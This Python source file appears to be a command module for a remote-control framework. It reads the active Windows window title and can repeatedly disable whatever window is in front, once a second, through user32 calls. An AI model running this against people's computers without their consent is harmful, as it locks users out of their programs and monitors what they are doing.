import ctypes, time, threading
import platform

from ctypes import wintypes
from typing import Optional
from ..commands import Command, CommandArgs, ICommandModule, CommandResult

command_arg_map = {
    Command.GET_FOREGROUND_WINDOW_TITLE: None,
    Command.STOP_DISABLER: None,
    Command.DISABLE_CURRENT_WINDOWS_CONTINOUS: None,
    Command.ENABLE_CURRENT_WINDOW: None,
    Command.DISABLE_CURRENT_WINDOW: None,
    Command.DISABLE_WINDOW_STATUS: None
}

class Window(ICommandModule):
    def __init__(self) -> None:
        if platform.system() == "Windows":
            self.GetForegroundWindow = ctypes.WinDLL('user32').GetForegroundWindow
            self.EnableWindow = ctypes.WinDLL('user32').EnableWindow 
            self.EnableWindow.argtypes = [ctypes.c_void_p, wintypes.BOOL]
            self.EnableWindow.restype = wintypes.BOOL
            self.handles = set()
            self.disable = False
            
    def get_disabling_status(self) -> CommandResult:
        return CommandResult(result={"status" : self.disable}, success=True)
    
    def disable_current_window(self) -> CommandResult:
        h = self.GetForegroundWindow()
        result = self.EnableWindow(h, False)
        return CommandResult(success=result, result="Current window disabled" if result else "Failed to disable current window")

    def enable_current_window(self) -> CommandResult:
        h = self.GetForegroundWindow()
        result = self.EnableWindow(h, True)
        return CommandResult(success=result, result="Current window enabled" if result else "Failed to enable current window")

    def disable_current_windows_continous(self) -> CommandResult:
        if not self.disable:
            self.disable = True
            t = threading.Thread(target=self.__disabler)
            t.start()
            return CommandResult(success=True, result="Continuous window disabling started")
        else:
            return CommandResult(success=False, result="Continuous window disabling is already running")

    def stop_disabler(self) -> CommandResult:
        if self.disable:
            self.disable = False
            for handle in self.handles:
                self.EnableWindow(handle, True)
            return CommandResult(success=True, result="Continuous window disabling stopped")
        return CommandResult(success=False, result="Continuous window disabling was not running")

    def get_foreground_window_title(self) -> CommandResult:
        _GetWindowText = ctypes.WinDLL('user32').GetWindowTextW
        _GetWindowText.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
        _GetWindowText.restype = ctypes.c_int
        GetForegroundWindow = self.GetForegroundWindow
        h = GetForegroundWindow()
        buffer = ctypes.create_unicode_buffer(300)
        _GetWindowText(h, buffer, 300)
        return CommandResult(success=True, result=buffer.value)

    def __disabler(self):
        while self.disable:
            h = self.GetForegroundWindow()
            self.EnableWindow(h, False)
            self.handles.add(h)
            time.sleep(1)
    
    def run(self, command: Command, args: Optional[CommandArgs] = None) -> CommandResult:
        if platform.system() != "Windows":
            return CommandResult(success=False, result="This command is supported on Windows only.")
        
        command_func_map_no_args = {
            Command.GET_FOREGROUND_WINDOW_TITLE: self.get_foreground_window_title,
            Command.STOP_DISABLER: self.stop_disabler,
            Command.DISABLE_CURRENT_WINDOWS_CONTINOUS: self.disable_current_windows_continous,
            Command.ENABLE_CURRENT_WINDOW: self.enable_current_window,
            Command.DISABLE_CURRENT_WINDOW: self.disable_current_window,
            Command.DISABLE_WINDOW_STATUS: self.get_disabling_status
        }

        try:
            if command in command_func_map_no_args:
                result = command_func_map_no_args[command]()
                return CommandResult(success=True, result=str(result))
            else:
                return CommandResult(success=False, result="No Args passed or command not recognized")
        except Exception as e:
            return CommandResult(success=False, result=f"Error executing {command}: {e}")
        






